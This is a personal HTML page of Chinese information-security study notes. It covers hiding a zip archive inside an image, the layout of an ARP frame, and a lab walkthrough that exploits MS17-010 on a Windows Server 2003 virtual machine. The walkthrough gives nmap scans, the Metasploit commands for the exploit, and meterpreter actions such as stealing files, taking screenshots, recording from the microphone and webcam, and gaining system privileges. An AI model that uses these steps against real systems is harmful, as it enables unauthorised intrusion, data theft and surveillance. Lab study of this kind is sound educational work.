<!DOCTYPE html>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/4.7.0/css/font-awesome.css">
    <link rel="stylesheet" type="text/css" href="security.css">
    <title>信息安全学习笔记</title>
</head>

<body style="width: 75%;">
<h1>信息安全学习笔记</h1>
<h2>简单的隐写术</h2>
<p class="content">
1. 创建一个txt文本文档，输入想要传送的文本（以在E盘创建test.txt为例），<br>
并在相同目录放入一张普通的图片（以a.jpg为例）；<br>
2. 利用压缩软件将该文本文档压缩为zip压缩包（test.zip）；<br>
3. 打开命令提示符（cmd），输入copy命令：<br>
<br>
   <code>E:</code><br>
   <code>copy /b a.jpg+test.zip a.jpg</code><br>
<br>
   无任何提示即操作成功<br>
4. 打开a.jpg，仍可查看原图片。打开压缩软件，选择“文件-打开”打开该图片，则显示test.txt。<br>
实际操作时，隐写的载体与内容不限。经测试，文本文档，图片，音视频等均可。
</p>    
<h2>ARP广播帧结构：（十六进制）</h2>
<h3>帧头  1~14</h3>
<p class="content">* 1~6  <b style="font-size: x-large;">ff ff ff ff ff ff</b>，即广播所有终端<br>
* 7~12  发送者的硬件(mac)地址<br>
* 13~14  类型特征码  ARP:0x0806</p>
<h3>ARP广播帧主体  15~42</h3>
<p class="content">
* 15~16  硬件类型  以太网:0x0001<br>
* 17~18  IP协议版本  IPv4:0x0800<br>
* 19  硬件地址长度  6<br>
* 20  协议地址长度  4<br>
* 21~22  广播帧类型  request:0x0001 reply:0x0002<br>
* 23~28  发送者的硬件(mac)地址<br>
* 29~32  发送者的IP地址<br>
* 33~38  解析目标的硬件(mac)地址  这个是解析的目标<br>
* 39~42  想要解析的IP地址
</p>

<h2>NMAP MSF实现对目标系统渗透<br>
（控制Windows XP 或 server 2003）</h2>
<b>信息安全大作业用到了这个项目，就把它贴到这里</b>
<a class="lnk" href="https://blog.csdn.net/weixin_44847002/article/details/105263781">参考资料</a>
<p class="content">
    1.Metasploit是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。<br>
2.此次采用kali Linux系统集成的metasploit进行测试验证MS17-010（永恒之蓝，著名比特币勒索漏洞）。实验环境均采用虚拟机。<br>
</p>
<p class="content">
    <b>Kali Linux：192.168.0.125</b>
</p>
<img src="srv2003/1.png">
<p class="content">
    <b>Windows Server 2003：192.168.0.115</b>
</p>
<img src="srv2003/2.png">
<p class="content">
1.先使用nmap探测网络中存活主机（设备）<br>
<b>nmap -sP 192.168.0.0/24</b>
</p>
<img src="srv2003/3.png">
<p class="content">
或使用<b>netdiscover -i eth0 -r 192.168.0.0/16</b>
</p><img src="srv2003/4.png">
<p class="content">
2.探测网络中的系统类型(nmap)
<b>nmap -O 192.168.0.0/24</b>
</p>
<img src="srv2003/5.png">
<p class="content">
3.端口扫描
<b>nmap -p 1-1024 192.168.0.115</b>
</p>
<img src="srv2003/6.png">
<p class="content">
端口介绍：<br>
<b style="font-size: x-large;">21：ftp</b><br>
<b style="font-size: x-large;">80：http</b><br>
135：服务dcom、rpc的端口----客户机连入系统服务<br>
139：netbios文件打印共享服务—共享磁盘<br>
445：文件夹共享、打印共享服务<br>
4.	利用server 2003自身漏洞(ms17-010)进行入侵<br>
前提：Windows server 2003 需要关闭防火墙；入侵前必须初始（msfdb init）、启动数据库（msfdb start）。<br>
<b>msfdb status</b> 查看数据库状态<br>
</p>
<img src="srv2003/7.png">
<p class="content">
    检测Windows server 2003是否存在ms17-010漏洞
    <b>nmap --script=smb-vuln*.nse 192.168.0.115</b>
</p>
<img src="srv2003/8.png">
<p class="content">
    <b>msfconsole</b> 准备入侵工具
</p>
<img src="srv2003/9.png">
<p class="content">
打开之后会显示
<b>msf5 &#62;</b>
中间的图案是随机的，每次都不一样。<br>
<b>msf5 &#62; search ms17_010</b> 搜索漏洞入侵模块<br>
<b>msf5 &#62; use windows/smb/ms17_010_psexec</b> 使用这个模块
</p>
<img src="srv2003/10.png">
<p class="content">
    <b>msf5 exploit(windows/smb/ms17_010_psexec) &#62; set rhosts 192.168.0.115</b>设置攻击目标的IP地址<br>
    <b>msf5 exploit(windows/smb/ms17_010_psexec) &#62; run</b> 运行入侵模块<br>
    <b style="color: red;font-size: xx-large;">注意：安装SQL server 2008时需要卸载Powershell相关的所有更新，否则会因为漏洞被修补而入侵失败！（下图为入侵失败照片）</b>
</p>
<img src="srv2003/11.png">
<p class="content">
若出现<br><b>meterpreter &#62; </b><br>，则证明入侵成功。
</p>
<img src="srv2003/12.png">
<p class="content">
    meterpreter十分强大，可以在对方机器无任何提示的情况下运行很多命令，其中shell可以直接运行windows的命令提示符（相当于cmd）<br></p>
    <p class="content">入侵结束。下面是测试环节：<br>
1.	文件。我们在windows server 2003的C:处创建一个test.txt。
</p>
<img src="srv2003/13.png">
<p class="content">
    利用cat命令可以读取文件
</p>
<img src="srv2003/14.png">
<p class="content">
    利用edit命令可以调用vim修改文件
</p>
<img src="srv2003/15.png"><br>
<img src="srv2003/16.png">
<p class="content">
    利用download命令可以下载文件，利用mkdir可以创建目录，利用rm可以删除文件或目录，利用cp复制文件，利用mv移动文件，利用execute运行文件等等。
</p>
<img src="srv2003/17.png">
<p class="content">
    2.数据库。需要用到命令提示符，使用shell命令调用。
</p>
<img src="srv2003/18.png">
<p class="content">
    利用sql命令创建一个叫test的数据库
</p>
<img src="srv2003/19.png">
<p class="content">
    在Windows Server 2003中创建表test_1，并插入两条数据。
</p>
<img src="srv2003/20.png"><br>
<img src="srv2003/21.png">
<p class="content">
    在kali上进行SQL查询操作，可以查询到刚刚创建的数据。
</p>
<img src="srv2003/22.png">
<p class="content">
    也可以进行添加，修改，删除操作。
</p>
<img src="srv2003/23.png">
<img src="srv2003/24.png">
<img src="srv2003/25.png">
<p class="content">
    3.系统操作。比如在cmd命令中停止一个正在运行的进程。
</p>
<img src="srv2003/26.png">
<p class="content">
    在meterpreter中使用screenshot截图。
</p>
<img src="srv2003/27.png">
<p class="content">
    或者远程播放音乐（play），打开摄像头（webcam_list），录音（record_mic），获取系统级权限（getsystem），监听键盘鼠标操作或者远程操控键盘鼠标，利用kill强制停止进程，利用shutdown关机，利用reboot重启等。
<b>&#60;完&#62;</b>
</p>
    <hr>
    <div id='footer'>
        <p><a style="color: blue;text-decoration: none;font-size:medium;" href="https://samzhou-2019.github.io/">https://samzhou-2019.github.io/</a> @旭旭 <a
                href="mailto:zhouzexu2010@sina.cn?cc=zxzhou@stu.xidian.edu.cn&subject=About%20samzhou-2019.github.io"
                target="_top">发送邮件</a>
        <br></i>QQ:1301621033</p>
        <script>
            document.write(Date());
        </script>
        </p>
    </div>
</body>

</html>